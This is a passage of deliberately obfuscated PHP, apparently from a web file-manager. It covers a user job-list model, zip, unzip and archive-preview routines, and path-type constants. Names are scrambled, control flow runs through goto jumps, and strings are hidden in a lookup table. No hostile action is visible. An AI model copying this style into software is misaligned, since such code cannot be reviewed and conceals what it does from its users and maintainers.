array($c‹íŒåÕ†Ğ[1418] => USER_ID, $c‹íŒåÕ†Ğ[397] => $bËåÚ‰Ñ, $c‹íŒåÕ†Ğ[447] => 0); return $this->where($EÇ’×é…)->delete(); } protected function rename($e‹ÑèÆ™Û, $aË‚îŠ¨Ú¦) { $c®°§®ÊÎª =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($e‹ÑèÆ™Û == $aË‚îŠ¨Ú¦) { return !1; } $b†”ôª™ = $this->getAutoName($aË‚îŠ¨Ú¦); if ($aË‚îŠ¨Ú¦ != $b†”ôª™) { return !1; } $a¸ç‰´œ = array($c®°§®ÊÎª[1418] => USER_ID, $c®°§®ÊÎª[447] => 0, $c®°§®ÊÎª[38] => $e‹ÑèÆ™Û); return $this->where($a¸ç‰´œ)->save(array($c®°§®ÊÎª[38] => $aË‚îŠ¨Ú¦)); } protected function resetSort($Fçö¼º³„) { $Aä¼Áù˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fçö¼º³„ = is_array($Fçö¼º³„) ? $Fçö¼º³„ : array(); $fÅŒ©¸ƒí„ = array($Aä¼Áù˜[1418] => USER_ID); for ($Cáñ§”¦³¾ = 0; $Cáñ§”¦³¾ < count($Fçö¼º³„); $Cáñ§”¦³¾++) { $fÅŒ©¸ƒí„[$Aä¼Áù˜[396]] = $Fçö¼º³„[$Cáñ§”¦³¾]; $this->where($fÅŒ©¸ƒí„)->save(array($Aä¼Áù˜[2102] => $Cáñ§”¦³¾ + 1)); } return !0; } protected function moveTop($C¼§¾¶“Éã) { goto dŒšÁ’ÛÊ©; dŒšÁ’ÛÊ©: $A®èÙ„ÖÇ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a®˜ƒîÆ = array($A®èÙ„ÖÇ[1418] => USER_ID, $A®èÙ„ÖÇ[447] => 0); $bØ“…ÜÈ‡æ = $this->where($a®˜ƒîÆ)->where(array($A®èÙ„ÖÇ[38] => $C¼§¾¶“Éã))->find(); goto f¥÷Úê…Û; f¥÷Úê…Û: if (!$bØ“…ÜÈ‡æ) { return; } $FĞÂñÂŠÊº = $this->field($A®èÙ„ÖÇ[378])->where($a®˜ƒîÆ)->order($A®èÙ„ÖÇ[2499])->select(); $FĞÂñÂŠÊº = array_to_keyvalue($FĞÂñÂŠÊº, $A®èÙ„ÖÇ[43], $A®èÙ„ÖÇ[378]); goto e‹‡áÑ¬ù¶; DŸïæ–Öëê: return $this->resetSort($FĞÂñÂŠÊº); goto F“Õ×†ˆÈÊ; e‹‡áÑ¬ù¶: $B–èÄïÕ = $FĞÂñÂŠÊº; $FĞÂñÂŠÊº = array_remove_value($FĞÂñÂŠÊº, $bØ“…ÜÈ‡æ[$A®èÙ„ÖÇ[378]]); array_unshift($FĞÂñÂŠÊº, $bØ“…ÜÈ‡æ[$A®èÙ„ÖÇ[378]]); goto DŸïæ–Öëê; F“Õ×†ˆÈÊ: } protected function moveBottom($Aœİä´İ‚) { $F—Û©¨ŒœÍ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bç˜Öóìğ = array($F—Û©¨ŒœÍ[1418] => USER_ID, $F—Û©¨ŒœÍ[447] => 0); $b¶¨ğ¤Çˆá = $this->where($Bç˜Öóìğ)->max($F—Û©¨ŒœÍ[2119]); $a…“Š‡ŒòË = array($F—Û©¨ŒœÍ[2119] => $b¶¨ğ¤Çˆá + 1); return $this->where($Bç˜Öóìğ)->where(array($F—Û©¨ŒœÍ[38] => $Aœİä´İ‚))->save($a…“Š‡ŒòË); } private function getAutoName($aªùğËèŠ°) { goto bÙáœ•Ó·Ø; bÙáœ•Ó·Ø: $e­¨¬Ä‡¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÁí˜•ôô = array($e­¨¬Ä‡¨[1418] => USER_ID, $e­¨¬Ä‡¨[447] => 0); $FÃòó´–Æ = $this->field($e­¨¬Ä‡¨[38])->where($eÁí˜•ôô)->select(); goto BÑ»ö¹©ö™; Dğ×ÊËÏ¬Ä: return $aªùğËèŠ° . "\50{$Eù±øŞœ«}\x29"; goto F­ÎùÍÃÛ‰; BÑ»ö¹©ö™: $FÃòó´–Æ = array_to_keyvalue($FÃòó´–Æ, $e­¨¬Ä‡¨[43], $e­¨¬Ä‡¨[38]); if (!$FÃòó´–Æ || !in_array($aªùğËèŠ°, $FÃòó´–Æ)) { return $aªùğËèŠ°; } for ($Eù±øŞœ« = 0; $Eù±øŞœ« < count($FÃòó´–Æ); $Eù±øŞœ«++) { if (!in_array($aªùğËèŠ° . "\50{$Eù±øŞœ«}\x29", $FÃòó´–Æ)) { return $aªùğËèŠ° . "\x28{$Eù±øŞœ«}\x29"; } } goto Dğ×ÊËÏ¬Ä; F­ÎùÍÃÛ‰: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\152\x6f\x62\x4c\151\x73\x74"; public $field = array("\156\141\155\x65", "\144\145\x73\143", "\x73\x6f\x72\164"); const JOB_KEY = "\163\145\x6c\146\112\x6f\x62\x4c\x69\163\x74"; public function listData($føÇˆöŒ¥¾ = false, $bƒÕøßÊø = "\x73\x6f\x72\164", $eÕëì•Ï—ï = false) { return parent::listData($føÇˆöŒ¥¾, $bƒÕøßÊø, $eÕëì•Ï—ï); } public function remove($Eò„ë¼ë›ó) { return parent::remove($Eò„ë¼ë›ó); } public function add($e•ôˆÊÊ‚) { $FŒ¸£–Ÿ·¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->findByName($e•ôˆÊÊ‚[$FŒ¸£–Ÿ·¡[38]])) { return !1; } $e•ôˆÊÊ‚[$FŒ¸£–Ÿ·¡[2119]] = $this->getSort(); return parent::insert($e•ôˆÊÊ‚); } private function getSort() { $b¤·õ·ÕËÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BÏ°İ¦ìÚ° = parent::listData(); $Eì¨ââƒ×ß = array_to_keyvalue($BÏ°İ¦ìÚ°, $b¤·õ·ÕËÏ[43], $b¤·õ·ÕËÏ[2119]); return empty($Eì¨ââƒ×ß) ? 0 : max($Eì¨ââƒ×ß) + 1; } public function update($DœÖÎÃÆéÜ, $DİŠ–ãÙãù) { $E³¢Ù°‹¯¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D‚õ–§ì‚ó = parent::listData($DœÖÎÃÆéÜ); $B‰™İ·™’ƒ = $this->findByName($DİŠ–ãÙãù[$E³¢Ù°‹¯¯[38]]); if (!$D‚õ–§ì‚ó || $B‰™İ·™’ƒ && $B‰™İ·™’ƒ[$E³¢Ù°‹¯¯[378]] != $D‚õ–§ì‚ó[$E³¢Ù°‹¯¯[378]]) { return !1; } return parent::update($DœÖÎÃÆéÜ, $DİŠ–ãÙãù); } public function setUserJob($aï‰Ã…›¸õ, $EÎÉùİ£˜¶) { goto EÚ‡Öè‘±ï; b—–Ìœ–: $A ‡µÂè  = array_to_keyvalue($eÅ±ãôŸå, $CÈ×É·Û[38]); $fõåÜŞì‘ = $CÈ×É·Û[372]; foreach ($EÎÉùİ£˜¶ as $EÄ‘êÌ²…Ï) { if ($A ‡µÂè [$EÄ‘êÌ²…Ï]) { $fõåÜŞì‘ .= $A ‡µÂè [$EÄ‘êÌ²…Ï][$CÈ×É·Û[378]] . $CÈ×É·Û[57]; } else { $BÏŠ¿£Ÿ¶ = $this->add($EÄ‘êÌ²…Ï); $fõåÜŞì‘ .= $BÏŠ¿£Ÿ¶ . $CÈ×É·Û[57]; } } goto bæã ¦¥–Ü; bæã ¦¥–Ü: $fõåÜŞì‘ = rtrim($fõåÜŞì‘, $CÈ×É·Û[57]); Model($CÈ×É·Û[490])->metaSet($aï‰Ã…›¸õ, self::JOB_KEY, $fõåÜŞì‘); goto a§ŠÜ»œ¼í; EÚ‡Öè‘±ï: $CÈ×É·Û =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!is_array($EÎÉùİ£˜¶)) { $EÎÉùİ£˜¶ = array($EÎÉùİ£˜¶); } $eÅ±ãôŸå = parent::listData(); goto b—–Ìœ–; a§ŠÜ»œ¼í: } public function getUserJob($dÔôâ«) { $CƒÜ¶æÁÉÍ = Model($_SERVER[¹÷ˆ§éÒ°ú][490])->metaGet($dÔôâ«); return $this->getUserJobInfo($CƒÜ¶æÁÉÍ[self::JOB_KEY]); } public function getUserJobInfo($FÁ–ŒŒªø‘) { goto fŠ•…‚Å¥Œ; cŸª­ŸˆËÄ: return $e”‹ËÑ…Ø…; goto BŠ…è³äÎè; fŠ•…‚Å¥Œ: $d·ŞÉ†ˆ‚Í =& $_SERVER[¹÷ˆ§éÒ°ú]; $dˆŞÚ¡½Œ = explode($d·ŞÉ†ˆ‚Í[57], $FÁ–ŒŒªø‘); $aòóó¿„ = parent::listData(); goto e¹ÎÏØÏ¨´; e¹ÎÏØÏ¨´: $aòóó¿„ = array_remove_key($aòóó¿„, $d·ŞÉ†ˆ‚Í[199]); $e”‹ËÑ…Ø… = array(); foreach ($dˆŞÚ¡½Œ as $Cêà½çíÀ…) { if (isset($aòóó¿„[$Cêà½çíÀ…])) { $e”‹ËÑ…Ø…[] = $aòóó¿„[$Cêà½çíÀ…]; } } goto cŸª­ŸˆËÄ; BŠ…è³äÎè: } } goto FÈŒÀëÁšÀ; B ›²î¤·á: define($_SERVER[¹÷ˆ§éÒ°ú][237], 1); define($_SERVER[¹÷ˆ§éÒ°ú][238], 2); define($_SERVER[¹÷ˆ§éÒ°ú][239], 3); goto eô•­¡½åŒ; CÈ‡…Åƒê: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $f†ŸÑšø‡­; if (!$f†ŸÑšø‡­) { $Bá´ˆÂß°ç = IO::init($_SERVER[¹÷ˆ§éÒ°ú][18]); } return $Bá´ˆÂß°ç; } private static function iconvSystem($fààéÑìå) { return self::local()->iconvSystem($fààéÑìå); } private static function iconvApp($F“÷“°ˆ) { return self::local()->iconvApp($F“÷“°ˆ); } public static function zip($BÙ¼°ÍİÂ¨, $bÓ®®¹ãŞˆ = "\172\151\160", $f¢Ë™Ó”«– = '', $D†ğ„ô¾¢¨ = REPEAT_RENAME) { goto b¬‚‡›İ; B¨‡ö´£Ñ: if ($f¢Ë™Ó”«– || !$fÑñ³¬‚ªÍ) { if ($fÑñ³¬‚ªÍ && strstr($fÑñ³¬‚ªÍ, TEMP_FILES)) { $aŸ‘âˆÄåå = $aËµƒœ¯‰Š = array(); recursion_dir($a¡ôáìêÖš, $aŸ‘âˆÄåå, $aËµƒœ¯‰Š, 0); foreach ($aŸ‘âˆÄåå as $aÓ»¼×¨âÔ) { del_dir($aÓ»¼×¨âÔ); } foreach ($aËµƒœ¯‰Š as $e³„æ¥ÊéÇ) { if ($e³„æ¥ÊéÇ == $F§µ°¯ë½) { continue; } del_file($e³„æ¥ÊéÇ); } } return $fÖëèØõ²Í; } $A„¿æ±òµ¥ = self::pathFather($cÇºœåªãÄ[$bßñ§ÊÌÃ[87]]); $aÆ¨êÃ„° = self::move($fÖëèØõ²Í, $A„¿æ±òµ¥, $D†ğ„ô¾¢¨); goto B‡‹—É¬‹­; B‡‹—É¬‹­: if (!$aÆ¨êÃ„°) { del_dir($fÑñ³¬‚ªÍ); show_json(LNG($bßñ§ÊÌÃ[1018]), !1); } del_dir($fÑñ³¬‚ªÍ); return $aÆ¨êÃ„°; goto Eêª½¾ÀĞ°; cÎ‰‡ò‚•ö: $fÖëèØõ²Í = $a¡ôáìêÖš . $b¬ªš£Ã í . $bßñ§ÊÌÃ[103] . $bÓ®®¹ãŞˆ; $fÖëèØõ²Í = get_filename_auto($fÖëèØõ²Í, $bßñ§ÊÌÃ[43], $D†ğ„ô¾¢¨); $F§µ°¯ë½ = self::iconvSystem($fÖëèØõ²Í); goto b¦‚Ô¥´; b¬‚‡›İ: $bßñ§ÊÌÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¼åÅÖ¶ = self::init($BÙ¼°ÍİÂ¨[0][$bßñ§ÊÌÃ[87]]); $cÇºœåªãÄ = self::info($BÙ¼°ÍİÂ¨[0][$bßñ§ÊÌÃ[87]]); goto CØ‘½÷ïÙ; b¦‚Ô¥´: foreach ($aËµƒœ¯‰Š as $fœ¼ÁÊ‹ë => $fÎé¦ê‹“¤) { $aËµƒœ¯‰Š[$fœ¼ÁÊ‹ë] = self::iconvSystem($fÎé¦ê‹“¤); } KodArchive::create($F§µ°¯ë½, $aËµƒœ¯‰Š); if (!IO::exist($fÖëèØõ²Í)) { if ($fÑñ³¬‚ªÍ) { del_dir($fÑñ³¬‚ªÍ); } show_json(LNG($bßñ§ÊÌÃ[1018]), !1); } goto B¨‡ö´£Ñ; CØ‘½÷ïÙ: $fÑñ³¬‚ªÍ = !1; if (!$f¢Ë™Ó”«– && $B¼åÅÖ¶->getType() == $bßñ§ÊÌÃ[114]) { $aËµƒœ¯‰Š = self::zipFileList($BÙ¼°ÍİÂ¨); } else { $fÑñ³¬‚ªÍ = $f¢Ë™Ó”«– ? $f¢Ë™Ó”«– : TEMP_FILES . $bßñ§ÊÌÃ[1016] . time() . rand_string(8) . $bßñ§ÊÌÃ[18]; mk_dir($fÑñ³¬‚ªÍ); $aËµƒœ¯‰Š = self::zipFileList($BÙ¼°ÍİÂ¨, $fÑñ³¬‚ªÍ); } $b¬ªš£Ã í = $cÇºœåªãÄ[$bßñ§ÊÌÃ[38]]; goto fƒÁ•Ë»ÃÍ; fƒÁ•Ë»ÃÍ: if (count($aËµƒœ¯‰Š) > 1) { $bÀÒ¬ïŒ­Ø = IO::info(IO::pathFather($cÇºœåªãÄ[$bßñ§ÊÌÃ[87]])); $b¬ªš£Ã í = $bÀÒ¬ïŒ­Ø[$bßñ§ÊÌÃ[38]]; } $a¡ôáìêÖš = $fÑñ³¬‚ªÍ; if (!$a¡ôáìêÖš) { $a¡ôáìêÖš = get_path_father($cÇºœåªãÄ[$bßñ§ÊÌÃ[87]]); $e†•Ëï¼ØÇ = IO::info($a¡ôáìêÖš); if (!$e†•Ëï¼ØÇ[$bßñ§ÊÌÃ[201]]) { show_json(LNG($bßñ§ÊÌÃ[1017]), !1); } } goto cÎ‰‡ò‚•ö; Eêª½¾ÀĞ°: } public static function unzip($DŒŒ¹éÎÑù, $AÜãÓ¥´ùÎ = "\x72\145\160\x6c\141\143\145") { goto côí´©‰°Û; DĞÛÙßòóª: return !0; goto fÅ£ìÔİ“; côí´©‰°Û: $Dù‹£Ÿ¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fæ©ÒäÖÑ = $DŒŒ¹éÎÑù[$Dù‹£Ÿ¥[87]]; $d•Õö½îôó = $DŒŒ¹éÎÑù[$Dù‹£Ÿ¥[1019]]; goto eÌ²âî°ã¢; fäùæ¡Ñòñ: mk_dir($CÈ¾…¼Á±Œ); $cŞ“ÍÊĞÑ = self::fileExt($bğ†°ñæÆ); $E¬…ƒáœ = $CÈ¾…¼Á±Œ . $Dù‹£Ÿ¥[103] . $cŞ“ÍÊĞÑ; goto f‚¶¹òŒø; aºçä‰òçî: $dàù›ôîóğ = KodArchive::extract($E¬…ƒáœ, $CÈ¾…¼Á±Œ . $Dù‹£Ÿ¥[18], $B™ÎÕ²¥óÂ); self::archiveExt(); if (!$dàù›ôîóğ[$Dù‹£Ÿ¥[1023]]) { show_json($Dù‹£Ÿ¥[1024] . $dàù›ôîóğ[$Dù‹£Ÿ¥[1025]], !1); } goto eÜ½‰ÄÂÙ; f‚¶¹òŒø: if (!@file_exists(self::iconvSystem($E¬…ƒáœ))) { $F›…‰¶ÅÓ¬ = self::localFilePath($Fæ©ÒäÖÑ, $cŞ“ÍÊĞÑ); $E¬…ƒáœ = $F›…‰¶ÅÓ¬ ? $F›…‰¶ÅÓ¬ : parent::download($Fæ©ÒäÖÑ, $E¬…ƒáœ); } $E¬…ƒáœ = self::iconvSystem($E¬…ƒáœ); $B™ÎÕ²¥óÂ = isset($DŒŒ¹éÎÑù[$Dù‹£Ÿ¥[1021]]) ? $DŒŒ¹éÎÑù[$Dù‹£Ÿ¥[1021]] : $Dù‹£Ÿ¥[1022]; goto aºçä‰òçî; dãø’¬¥ÄË: foreach ($b‡î­êÓÎŞ as $FŠò¬œõí) { $FŠò¬œõí = self::iconvApp($FŠò¬œõí); self::move($FŠò¬œõí, $d•Õö½îôó, $AÜãÓ¥´ùÎ); } del_dir($CÈ¾…¼Á±Œ); if (!$F›…‰¶ÅÓ¬) { del_file($E¬…ƒáœ); } goto DĞÛÙßòóª; eÌ²âî°ã¢: if (!($bğ†°ñæÆ = parent::info($Fæ©ÒäÖÑ))) { show_json(LNG($Dù‹£Ÿ¥[1020]), !1); } if (!($e×œ‰™²ÈÁ = parent::infoFull($d•Õö½îôó))) { $d•Õö½îôó = parent::mkdir($d•Õö½îôó); $e×œ‰™²ÈÁ = array($Dù‹£Ÿ¥[87] => $d•Õö½îôó); } else { if (isset($e×œ‰™²ÈÁ[$Dù‹£Ÿ¥[380]]) && trim($e×œ‰™²ÈÁ[$Dù‹£Ÿ¥[87]], $Dù‹£Ÿ¥[18]) != trim($d•Õö½îôó, $Dù‹£Ÿ¥[18])) { $f’êŠÕ®¡İ = KodIO::make($e×œ‰™²ÈÁ[$Dù‹£Ÿ¥[474]]); $FÙ”Ó©ĞåË = parent::fileNameAuto($f’êŠÕ®¡İ, $e×œ‰™²ÈÁ[$Dù‹£Ÿ¥[38]], REPEAT_RENAME_FOLDER, !0); $d•Õö½îôó = parent::mkdir($f’êŠÕ®¡İ . $FÙ”Ó©ĞåË); $e×œ‰™²ÈÁ = array($Dù‹£Ÿ¥[87] => $d•Õö½îôó); } } $d•Õö½îôó = $e×œ‰™²ÈÁ[$Dù‹£Ÿ¥[87]]; goto fî §Çó’ª; fî §Çó’ª: $E©Šçº—Ìƒ = self::tmpFileName($bğ†°ñæÆ); $CÈ¾…¼Á±Œ = TEMP_FILES . $E©Šçº—Ìƒ; del_dir($CÈ¾…¼Á±Œ); goto fäùæ¡Ñòñ; eÜ½‰ÄÂÙ: Hook::trigger($Dù‹£Ÿ¥[1026], $CÈ¾…¼Á±Œ); recursion_dir($CÈ¾…¼Á±Œ, $A¥ğÜéßº¾, $D¨¾â¹Şš‘, 0); $b‡î­êÓÎŞ = array_merge($A¥ğÜéßº¾, $D¨¾â¹Şš‘); goto dãø’¬¥ÄË; fÅ£ìÔİ“: } public static function unzipList($F²…¥‚»‚­) { goto DÔ¸ë¬Ü“; E“å¥Ù§ñ: self::archiveExt(); del_dir($c›ŠÖ‘›); if (!$e¦÷¹‡ŸˆÙ[$dçæ»ñÎÚ[1023]]) { show_json($e¦÷¹‡ŸˆÙ[$dçæ»ñÎÚ[1025]], !1); } goto B‰–Ë½’´É; B¦‰øä×Éª: $b˜·øÉ§º± = 50000; if (request_url_safe($d±ƒÂªöÚÂ)) { $bë¥˜·Ÿ = parse_url_query($d±ƒÂªöÚÂ); if (!isset($bë¥˜·Ÿ[$dçæ»ñÎÚ[87]])) { show_json($dçæ»ñÎÚ[1028], !1); } } $bËî‹ÙÒ´Õ = isset($bë¥˜·Ÿ) ? $bë¥˜·Ÿ[$dçæ»ñÎÚ[87]] : $d±ƒÂªöÚÂ; goto A’ùÒÊç¯„; CÙ‰‘ˆÆó: if (!is_dir($c›ŠÖ‘›)) { mk_dir($c›ŠÖ‘›); } $F³Ó¯ë²øâ = $c›ŠÖ‘› . $dçæ»ñÎÚ[18] . $EÕ´˜«øò¬; if (!@file_exists(self::iconvSystem($F³Ó¯ë²øâ))) { if (isset($bë¥˜·Ÿ)) { url_request($d±ƒÂªöÚÂ, $dçæ»ñÎÚ[1030], $F³Ó¯ë²øâ); } else { $eé‹Íø¡¬¾ = self::localFilePath($d±ƒÂªöÚÂ, $D¢ğ±½¥ã); $F³Ó¯ë²øâ = $eé‹Íø¡¬¾ ? $eé‹Íø¡¬¾ : self::download($d±ƒÂªöÚÂ, $F³Ó¯ë²øâ); } } goto EùÒŠÜ‘; B‰–Ë½’´É: $FÖˆ¥Êİ‰Á = json_encode($e¦÷¹‡ŸˆÙ[$dçæ»ñÎÚ[1025]]); self::setContent($eÚÜ®®ä²ë, $FÖˆ¥Êİ‰Á); if (count($e¦÷¹‡ŸˆÙ[$dçæ»ñÎÚ[1025]]) >= $b˜·øÉ§º±) { show_json(sprintf(LNG($dçæ»ñÎÚ[1029]), count($e¦÷¹‡ŸˆÙ[$dçæ»ñÎÚ[1025]])), !1); } goto AÊ˜ã­¿Óœ; EùÒŠÜ‘: $F³Ó¯ë²øâ = self::iconvSystem($F³Ó¯ë²øâ); if ($eİÌÁÊ³Õê >= 0) { $a¡æÔò¬·‡ = isset($F²…¥‚»‚­[$dçæ»ñÎÚ[1031]]) ? $F²…¥‚»‚­[$dçæ»ñÎÚ[1031]] : !1; $eõ±°ÁÍÎ = isset($F²…¥‚»‚­[$dçæ»ñÎÚ[38]]) ? $F²…¥‚»‚­[$dçæ»ñÎÚ[38]] : $dçæ»ñÎÚ[43]; KodArchive::filePreview($F³Ó¯ë²øâ, $eİÌÁÊ³Õê, $a¡æÔò¬·‡, $eõ±°ÁÍÎ); self::archiveExt(); die; } $e¦÷¹‡ŸˆÙ = KodArchive::listContent($F³Ó¯ë²øâ); goto E“å¥Ù§ñ; DÔ¸ë¬Ü“: $dçæ»ñÎÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d±ƒÂªöÚÂ = $F²…¥‚»‚­[$dçæ»ñÎÚ[87]]; $eİÌÁÊ³Õê = isset($F²…¥‚»‚­[$dçæ»ñÎÚ[1027]]) ? $F²…¥‚»‚­[$dçæ»ñÎÚ[1027]] : -1; goto B¦‰øä×Éª; A’ùÒÊç¯„: $DïëÇË˜­ = self::info($bËî‹ÙÒ´Õ); $D¢ğ±½¥ã = self::fileExt($DïëÇË˜­); $bÆ„„¥¸®Ú = self::tmpFileName($DïëÇË˜­); goto f½ù¥Ï„”Ò; AÊ˜ã­¿Óœ: return $e¦÷¹‡ŸˆÙ[$dçæ»ñÎÚ[1025]]; goto bêİŠ¶Ï•; f½ù¥Ï„”Ò: if (isset($bë¥˜·Ÿ)) { $C¹»®Ä‘Êë = array($bë¥˜·Ÿ[$dçæ»ñÎÚ[87]], $bë¥˜·Ÿ[$dçæ»ñÎÚ[1027]], $bë¥˜·Ÿ[$dçæ»ñÎÚ[38]]); $EÕ´˜«øò¬ = md5(implode($dçæ»ñÎÚ[82], $C¹»®Ä‘Êë)) . $dçæ»ñÎÚ[103] . get_path_ext($bë¥˜·Ÿ[$dçæ»ñÎÚ[38]]); } else { $C¹»®Ä‘Êë = array($DïëÇË˜­[$dçæ»ñÎÚ[38]], $DïëÇË˜­[$dçæ»ñÎÚ[87]], $DïëÇË˜­[$dçæ»ñÎÚ[89]]); $EÕ´˜«øò¬ = md5(implode($dçæ»ñÎÚ[82], $C¹»®Ä‘Êë)) . $dçæ»ñÎÚ[103] . $D¢ğ±½¥ã; } if ($eİÌÁÊ³Õê == -1) { $eÚÜ®®ä²ë = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\151\x65\x77\x2f{$bÆ„„¥¸®Ú}\57{$EÕ´˜«øò¬}\x2e\x6c\157\x67"; $cŸ«ÌÓğĞ = self::infoFull($eÚÜ®®ä²ë); if ($cŸ«ÌÓğĞ) { $eÚÜ®®ä²ë = $cŸ«ÌÓğĞ[$dçæ»ñÎÚ[87]]; $bƒàÏÔ· = self::getContent($eÚÜ®®ä²ë); if ($bƒàÏÔ·) { $FÖˆ¥Êİ‰Á = json_decode($bƒàÏÔ·, !0); if (count($FÖˆ¥Êİ‰Á) >= $b˜·øÉ§º±) { show_json(sprintf(LNG($dçæ»ñÎÚ[1029]), count($FÖˆ¥Êİ‰Á)), !1); } return $FÖˆ¥Êİ‰Á; } } else { $eÚÜ®®ä²ë = self::mkfile($eÚÜ®®ä²ë); } } $c›ŠÖ‘› = TEMP_FILES . $bÆ„„¥¸®Ú; goto CÙ‰‘ˆÆó; bêİŠ¶Ï•: } private static function fileExt($D§”ìª½ì¸) { $FÅÃ¥§±ˆ… =& $_SERVER[¹÷ˆ§éÒ°ú]; $CÙ•æÎ£çí = $D§”ìª½ì¸[$FÅÃ¥§±ˆ…[172]]; if ($CÙ•æÎ£çí == $FÅÃ¥§±ˆ…[1032]) { $EØïøËß×É = $FÅÃ¥§±ˆ…[1033]; if (substr($D§”ìª½ì¸[$FÅÃ¥§±ˆ…[38]], -strlen($EØïøËß×É)) == $EØïøËß×É) { $CÙ•æÎ£çí = $FÅÃ¥§±ˆ…[1034]; } } self::archiveExt($CÙ•æÎ£çí); return $CÙ•æÎ£çí; } private static function zipFileList($BÉ›¤•…§, $D„ÌÈÖ»áª = false) { $bòíÇ“‹˜ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e”’‡°ˆºÁ = array(); foreach ($BÉ›¤•…§ as $f‰ŒÙõ Õ) { $Béè°å = $f‰ŒÙõ Õ[$bòíÇ“‹˜[87]]; if ($D„ÌÈÖ»áª) { $Béè°å = self::copy($f‰ŒÙõ Õ[$bòíÇ“‹˜[87]], $D„ÌÈÖ»áª, $bòíÇ“‹˜[739]); } if ($Béè°å && self::local()->exist($Béè°å)) { $e”’‡°ˆºÁ[$f‰ŒÙõ Õ[$bòíÇ“‹˜[87]]] = $Béè°å; } } if (!empty($e”’‡°ˆºÁ)) { return array_values($e”’‡°ˆºÁ); } show_json(LNG($bòíÇ“‹˜[1035]), !1); } public static function tmpFileName($d¯Ç‹¾æËø) { $FëŸÈç‹½Œ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E§èøßó•¤ = array($d¯Ç‹¾æËø[$FëŸÈç‹½Œ[38]], $d¯Ç‹¾æËø[$FëŸÈç‹½Œ[87]], $d¯Ç‹¾æËø[$FëŸÈç‹½Œ[89]], $d¯Ç‹¾æËø[$FëŸÈç‹½Œ[472]]); return md5(implode($FëŸÈç‹½Œ[82], $E§èøßó•¤)); } private static function localFilePath($FŞó·œªÉ, $Dğ‰î‹ìƒ) { goto AÕŒœ°—; bÖâÑØÁÛ‡: if ($A§„÷ÛÄêª == $FÙ¡Ñ£óõ[114] || $A§„÷ÛÄêª == $FÙ¡Ñ£óõ[1039]) { if (!$b‡¾áç„Ãİ->exist($b‡¾áç„Ãİ->path)) { show_json(LNG($FÙ¡Ñ£óõ[113]), !1); } return $b‡¾áç„Ãİ->path; } return !1; goto B‹ßàã²‚; AÕŒœ°—: $FÙ¡Ñ£óõ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($Dğ‰î‹ìƒ == $FÙ¡Ñ£óõ[1036] && strtoupper(substr(PHP_OS, 0, 3)) == $FÙ¡Ñ£óõ[1037]) { return !1; } $C½±²Š¦î = KodIO::parse($FŞó·œªÉ); goto D„’³±ùˆ„; D„’³±ùˆ„: if ($C½±²Š¦î[$FÙ¡Ñ£óõ[39]] == KodIO::KOD_SOURCE) { $B«õ†°ÊĞÙ = Model($FÙ¡Ñ£óõ[747])->fileInfoGet(KodIO::sourceID($FŞó·œªÉ)); if (!$B«õ†°ÊĞÙ[$FÙ¡Ñ£óõ[87]]) { show_json($FÙ¡Ñ£óõ[1038], !1); } $FŞó·œªÉ = $B«õ†°ÊĞÙ[$FÙ¡Ñ£óõ[87]]; } $b‡¾áç„Ãİ = self::init($FŞó·œªÉ); $A§„÷ÛÄêª = $b‡¾áç„Ãİ->getType(); goto bÖâÑØÁÛ‡; B‹ßàã²‚: } private static function archiveExt($b¶‡õÛ¬ = '') { $GLOBALS[$_SERVER[¹÷ˆ§éÒ°ú][1040]] = $b¶‡õÛ¬; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\x72\x52\x65\x63\171\x63\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\145\x72\x46\x69\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\106\x69\x6c\145\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\160\x52\x6f\157\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\173\x75\163\145\x72\123\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\162\x53\x68\x61\162\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\124\157\115\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\141\x72\x65\x49\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\111\x74\x65\155\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\x7b\x73\145\141\162\x63\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\165\x73\145\162\x52\x65\156\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\145\x72\x7d"; public static function typeList() { $cÛƒ·Ñ‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($cÛƒ·Ñ‚[1041] => self::KOD_SOURCE, $cÛƒ·Ñ‚[1042] => self::KOD_USER_RECYCLE, $cÛƒ·Ñ‚[1043] => self::KOD_USER_FAV, $cÛƒ·Ñ‚[1044] => self::KOD_USER_FILE_TAG, $cÛƒ·Ñ‚[1045] => self::KOD_USER_FILE_TYPE, $cÛƒ·Ñ‚[1046] => self::KOD_GROUP_ROOT_SELF, $cÛƒ·Ñ‚[1047] => self::KOD_USER_SHARE, $cÛƒ·Ñ‚[1048] => self::KOD_USER_SHARE_LINK, $cÛƒ·Ñ‚[1049] => self::KOD_USER_SHARE_TO_ME, 